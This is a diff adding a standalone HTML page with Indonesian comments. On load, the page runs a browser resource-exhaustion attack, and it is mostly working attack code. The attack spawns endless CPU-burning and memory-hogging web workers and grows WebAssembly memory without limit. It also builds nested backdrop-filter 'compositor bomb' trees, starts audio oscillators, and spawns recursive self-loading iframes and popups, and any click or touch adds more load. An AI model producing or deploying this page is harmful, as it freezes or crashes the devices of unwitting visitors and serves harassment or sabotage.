@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title></title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      touch-action: none;
+    }
+
+    #stage {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    canvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      mix-blend-mode: screen;
+    }
+
+    /* CSS Heavy Filter Blurring */
+    .blob {
+      position: absolute;
+      width: 60vw;
+      height: 60vh;
+      border-radius: 45%;
+      background: radial-gradient(circle, #ff0055, #00ffff, #ffea00, transparent 70%);
+      filter: blur(50px) contrast(3);
+      animation: spin 0.15s linear infinite;
+      mix-blend-mode: color-dodge;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg) scale(1.3); }
+    }
+
+    /* Nested Backdrop-Filter Compositor Bomb */
+    .blur-nest-root {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 10;
+      overflow: hidden;
+    }
+
+    .blur-node {
+      position: absolute;
+      inset: 2px;
+      backdrop-filter: blur(40px) contrast(1.5) saturate(2);
+      -webkit-backdrop-filter: blur(40px) contrast(1.5);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      animation: shift 0.25s infinite alternate ease-in-out;
+      will-change: transform, backdrop-filter;
+    }
+
+    @keyframes shift {
+      from { transform: scale(0.99) rotate(0.05deg); }
+      to { transform: scale(1.01) rotate(-0.05deg); }
+    }
+
+    /* Hydra Iframes Grid */
+    #nest {
+      position: fixed;
+      inset: 0;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      grid-template-rows: repeat(3, 1fr);
+      opacity: 0.25;
+      z-index: 1;
+    }
+    #nest iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+      background: #000;
+    }
+
+    body.slave #nest, body.slave .blur-nest-root {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="nest"></div>
+  <div id="stage"></div>
+  <div id="blurRoot" class="blur-nest-root"></div>
+
+  <script>
+  (() => {
+    const params = new URLSearchParams(location.search);
+    const SLAVE = params.get('slave') === '1';
+    const MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
+      (navigator.maxTouchPoints > 1 && Math.min(screen.width, screen.height) < 900);
+
+    const cores = navigator.hardwareConcurrency || (MOBILE ? 4 : 8);
+
+    if (SLAVE) document.body.classList.add('slave');
+
+    // Konfigurasi Parameter Brutal
+    const P = {
+      ramChunkMB: MOBILE ? 48 : 96,
+      burstCount: SLAVE ? (MOBILE ? 16 : 28) : (MOBILE ? 24 : 48),
+      ramWorkers: Math.max(MOBILE ? 8 : 16, cores * 2),
+      
+      cpuWorkers: Math.max(MOBILE ? 24 : 48, cores * (MOBILE ? 4 : 7)),
+      addInterval: SLAVE ? 20 : 25,
+      addCpu: 3,
+      addRam: 2,
+
+      wasmGrowEvery: MOBILE ? 15 : 10,
+      wasmPages: MOBILE ? 64 : 128,
+
+      canvasCount: SLAVE ? 2 : 4,
+      cw: MOBILE ? 960 : 1280,
+      ch: MOBILE ? 540 : 720,
+      glEnabled: true,
+      glW: MOBILE ? 1280 : 1920,
+      glH: MOBILE ? 720 : 1080,
+      blobCount: SLAVE ? 8 : 16,
+
+      audioCount: SLAVE ? 12 : 32,
+
+      nestDepth: SLAVE ? 15 : (MOBILE ? 30 : 60),
+      nestTrees: SLAVE ? 1 : (MOBILE ? 2 : 4),
+
+      mainBurnMs: SLAVE ? 6 : 14,
+      eatPerFrameMB: MOBILE ? 16 : 32,
+      eatFrameEvery: 2,
+
+      hydra: true,
+      iframeStart: SLAVE ? 0 : (MOBILE ? 6 : 10),
+      iframeTarget: SLAVE ? 0 : (MOBILE ? 14 : 22),
+      iframeInterval: 30,
+      popupCount: SLAVE || MOBILE ? 0 : 6
+    };
+
+    const stage = document.getElementById('stage');
+    const nest = document.getElementById('nest');
+    const blurRoot = document.getElementById('blurRoot');
+    const memoryHolder = [];
+    const activeWorkers = [];
+    let allocatedMB = 0;
+
+    function touch(u8) {
+      for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
+    }
+
+    function eat(mb) {
+      const size = mb || P.ramChunkMB;
+      try {
+        const u8 = new Uint8Array(size * 1024 * 1024);
+        touch(u8);
+        memoryHolder.push(u8);
+        memoryHolder.push(new Float64Array(size * 32 * 1024));
+        allocatedMB += size;
+      } catch (_) {
+        try {
+          const small = new Uint8Array(4 * 1024 * 1024);
+          touch(small);
+          memoryHolder.push(small);
+          allocatedMB += 4;
+        } catch (__) {}
+      }
+    }
+
+    // Worker Scripts
+    const cpuCode = `
+      const N = 1024 * 512;
+      const a = new Float64Array(N), b = new Float64Array(N);
+      let n = Math.random();
+      function burn() {
+        for (let i = 0; i < N; i++) {
+          n = Math.sin(n + a[i]) * Math.cos(b[i]) + Math.sqrt(Math.abs(n) + 1e-9);
+          a[i] = n;
+          b[i] = n * 1.01;
+        }
+        postMessage(1);
+        setTimeout(burn, 0);
+        Promise.resolve().then(burn);
+      }
+      burn();
+      setInterval(function() {
+        let x = 1;
+        for (let i = 0; i < 6e6; i++) x = Math.sin(x) * Math.cos(x);
+      }, 1);
+    `;
+
+    const ramCode = `
+      const hold = [];
+      const mb = ${P.ramChunkMB};
+      let used = 0;
+      function alloc() {
+        try {
+          const u8 = new Uint8Array(mb * 1024 * 1024);
+          for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
+          hold.push(u8);
+          used += mb;
+          postMessage(used);
+        } catch (e) {
+          try {
+            const u8 = new Uint8Array(4 * 1024 * 1024);
+            for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
+            hold.push(u8);
+            used += 4;
+            postMessage(used);
+          } catch (e2) {}
+        }
+        setTimeout(alloc, 2);
+      }
+      alloc();
+      setInterval(alloc, 4);
+    `;
+
+    function createWorker(code) {
+      try {
+        const blob = new Blob([code], { type: 'application/javascript' });
+        const w = new Worker(URL.createObjectURL(blob));
+        activeWorkers.push(w);
+        return w;
+      } catch (_) {
+        return null;
+      }
+    }
+
+    function spawnCPU(n) {
+      for (let i = 0; i < n; i++) createWorker(cpuCode);
+    }
+    function spawnRAM(n) {
+      for (let i = 0; i < n; i++) createWorker(ramCode);
+    }
+
+    // Nested Compositor Tree
+    function createNestedBlurTree(depth) {
+      const rootDiv = document.createElement('div');
+      rootDiv.className = 'blur-node';
+      let current = rootDiv;
+      for (let d = 0; d < depth; d++) {
+        const nextDiv = document.createElement('div');
+        nextDiv.className = 'blur-node';
+        current.appendChild(nextDiv);
+        current = nextDiv;
+      }
+      return rootDiv;
+    }
+
+    // ==========================================================
+    // FUNGSI INTI: EKSEKUSI BRUTAL SETELAH HALAMAN SIAP
+    // ==========================================================
+    function launchBrutal() {
+      // 1. Alokasi RAM Awal & Thread Worker
+      for (let i = 0; i < P.burstCount; i++) eat();
+      spawnCPU(P.cpuWorkers);
+      spawnRAM(P.ramWorkers);
+
+      // Multiplier dinamis tanpa henti
+      setInterval(() => {
+        for (let i = 0; i < P.addCpu; i++) createWorker(cpuCode);
+        for (let i = 0; i < P.addRam; i++) createWorker(ramCode);
+        eat();
+      }, P.addInterval);
+
+      // 2. WebAssembly Memory Exhaustion
+      try {
+        const wasmMem = new WebAssembly.Memory({
+          initial: MOBILE ? 64 : 256,
+          maximum: MOBILE ? 2048 : 65536
+        });
+        memoryHolder.push(wasmMem);
+        setInterval(() => {
+          try {
+            wasmMem.grow(P.wasmPages);
+            touch(new Uint8Array(wasmMem.buffer));
+          } catch (_) {}
+        }, P.wasmGrowEvery);
+      } catch (_) {}
+
+      // 3. Nested Backdrop Filter
+      if (!SLAVE && blurRoot) {
+        for (let t = 0; t < P.nestTrees; t++) {
+          try {
+            blurRoot.appendChild(createNestedBlurTree(P.nestDepth));
+          } catch (_) {}
+        }
+        setInterval(() => {
+          try {
+            blurRoot.appendChild(createNestedBlurTree(Math.floor(P.nestDepth * 0.7)));
+            if (blurRoot.childNodes.length > 8) {
+              blurRoot.removeChild(blurRoot.firstChild);
+            }
+          } catch (_) {}
+        }, 500);
+      }
+
+      // 4. Web Audio Stress
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        const ac = new AudioCtx();
+        for (let i = 0; i < P.audioCount; i++) {
+          const o = ac.createOscillator();
+          const g = ac.createGain();
+          const f = ac.createBiquadFilter();
+          f.type = 'bandpass';
+          f.frequency.value = 80 + i * 75;
+          f.Q.value = 25;
+          g.gain.value = 0.0002;
+          o.type = i % 2 ? 'sawtooth' : 'square';
+          o.frequency.value = 35 + i * 25;
+          o.connect(f);
+          f.connect(g);
+          g.connect(ac.destination);
+          o.start();
+        }
+        ac.resume().catch(() => {});
+        window.addEventListener('touchstart', () => ac.resume().catch(() => {}), { once: true });
+        window.addEventListener('click', () => ac.resume().catch(() => {}), { once: true });
+      } catch (_) {}
+
+      // 5. Hydra Multi-Iframe Spawner
+      if (!SLAVE && P.hydra) {
+        const slaveUrl = (() => {
+          const u = new URL(location.href);
+          u.searchParams.set('slave', '1');
+          return u.href;
+        })();
+        const iframes = [];
+
+        function addIframe() {
+          const f = document.createElement('iframe');
+          f.src = slaveUrl + '&t=' + Date.now() + Math.random();
+          nest.appendChild(f);
+          iframes.push(f);
+          return f;
+        }
+
+        for (let i = 0; i < P.iframeStart; i++) addIframe();
+        let createdCount = P.iframeStart;
+        const iframeTimer = setInterval(() => {
+          if (createdCount >= P.iframeTarget) {
+            clearInterval(iframeTimer);
+            return;
+          }
+          addIframe();
+          addIframe();
+          createdCount += 2;
+        }, P.iframeInterval);
+
+        for (let i = 0; i < P.popupCount; i++) {
+          try {
+            window.open(slaveUrl + '&p=' + i + '&t=' + Date.now(), 'pop_' + i + '_' + Date.now(),
+              'width=260,height=150,left=' + (i * 35) + ',top=' + (i * 25));
+          } catch (_) {}
+        }
+
+        setInterval(() => {
+          for (let i = 0; i < iframes.length; i++) {
+            let dead = false;
+            try {
+              if (!iframes[i].contentWindow) dead = true;
+              else void iframes[i].contentDocument;
+            } catch (_) { dead = true; }
+            if (dead) {
+              try { iframes[i].remove(); } catch (_) {}
+              iframes[i] = addIframe();
+            }
+          }
+          if (iframes.length < P.iframeTarget) {
+            addIframe();
+            addIframe();
+          }
+          eat(64);
+        }, 250);
+      }
+    }
+
+    // Interaksi Layar: Trigger lonjakan brutal instan saat disentuh/diklik
+    window.addEventListener('touchstart', surge, { passive: true });
+    window.addEventListener('click', surge);
+    function surge() {
+      spawnCPU(8);
+      spawnRAM(6);
+      for (let i = 0; i < 8; i++) eat(64);
+    }
+
+    // Inisialisasi Visual (Canvas & Shaders)
+    const canvases = [];
+    const ctxs = [];
+    for (let i = 0; i < P.canvasCount; i++) {
+      const c = document.createElement('canvas');
+      c.width = P.cw;
+      c.height = P.ch;
+      stage.appendChild(c);
+      canvases.push(c);
+      ctxs.push(c.getContext('2d'));
+    }
+
+    for (let i = 0; i < P.blobCount; i++) {
+      const el = document.createElement('div');
+      el.className = 'blob';
+      el.style.left = (Math.random() * 90) + '%';
+      el.style.top = (Math.random() * 90) + '%';
+      stage.appendChild(el);
+    }
+
+    let gl = null, glProg = null;
+    if (P.glEnabled) {
+      try {
+        const glCanvas = document.createElement('canvas');
+        glCanvas.width = P.glW;
+        glCanvas.height = P.glH;
+        stage.appendChild(glCanvas);
+        gl = glCanvas.getContext('webgl', { powerPreference: 'high-performance' });
+
+        if (gl) {
+          const vs = gl.createShader(gl.VERTEX_SHADER);
+          gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
+          gl.compileShader(vs);
+
+          const fs = gl.createShader(gl.FRAGMENT_SHADER);
+          gl.shaderSource(fs, `
+            precision highp float;
+            varying vec2 v;
+            uniform float t;
+            void main() {
+              vec2 p = v * 50.0;
+              float n = 0.0;
+              for(int i = 0; i < 50; i++) {
+                float fi = float(i);
+                n += sin(p.x * fi * 0.14 + t) * cos(p.y * fi * 0.17 - t);
+                p *= 1.04;
+              }
+              gl_FragColor = vec4(0.5 + 0.5 * sin(n + t), 0.5 + 0.5 * cos(n * 1.5), 0.5 + 0.5 * sin(n * 2.5 - t), 1.0);
+            }
+          `);
+          gl.compileShader(fs);
+
+          glProg = gl.createProgram();
+          gl.attachShader(glProg, vs);
+          gl.attachShader(glProg, fs);
+          gl.linkProgram(glProg);
+          gl.useProgram(glProg);
+
+          const buf = gl.createBuffer();
+          gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+          gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+
+          const loc = gl.getAttribLocation(glProg, 'a');
+          gl.enableVertexAttribArray(loc);
+          gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+        }
+      } catch (_) {}
+    }
+
+    // Main Thread Burner & Render Loop
+    let frameCount = 0;
+    function tick(timestamp) {
+      frameCount++;
+
+      const burnDeadline = performance.now() + P.mainBurnMs;
+      let burnAcc = Math.random();
+      while (performance.now() < burnDeadline) {
+        burnAcc = Math.sin(burnAcc) * Math.cos(burnAcc);
+      }
+
+      for (let i = 0; i < ctxs.length; i++) {
+        const ctx = ctxs[i], c = canvases[i];
+        if (!ctx) continue;
+        ctx.fillStyle = 'rgb(' + ((timestamp + i * 40) % 255 | 0) + ',' + ((timestamp * 0.6) % 255 | 0) + ',100)';
+        ctx.globalAlpha = 0.2;
+        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 150, 150);
+        ctx.filter = 'blur(4px)';
+        ctx.drawImage(c, -8, -8, c.width + 16, c.height + 16);
+      }
+
+      if (gl && glProg) {
+        gl.uniform1f(gl.getUniformLocation(glProg, 't'), timestamp * 0.0015);
+        for (let i = 0; i < 8; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+      }
+
+      if (frameCount % P.eatFrameEvery === 0) eat(P.eatPerFrameMB);
+
+      requestAnimationFrame(tick);
+    }
+
+    // ==========================================================
+    // KUNCI PERBAIKAN: TUNGGU HALAMAN SELESAI LOAD, LALU BRUTAL
+    // ==========================================================
+    function onReady() {
+      requestAnimationFrame(() => {
+        tick(performance.now());
+        // Beri jeda 80ms agar koneksi & DOM selesai dipetakan browser, lalu hajar beban penuh
+        setTimeout(launchBrutal, 80);
+      });
+    }
+
+    if (document.readyState === 'complete') {
+      onReady();
+    } else {
+      window.addEventListener('load', onReady);
+    }
+  })();
+  </script>
+</body>
+</html>
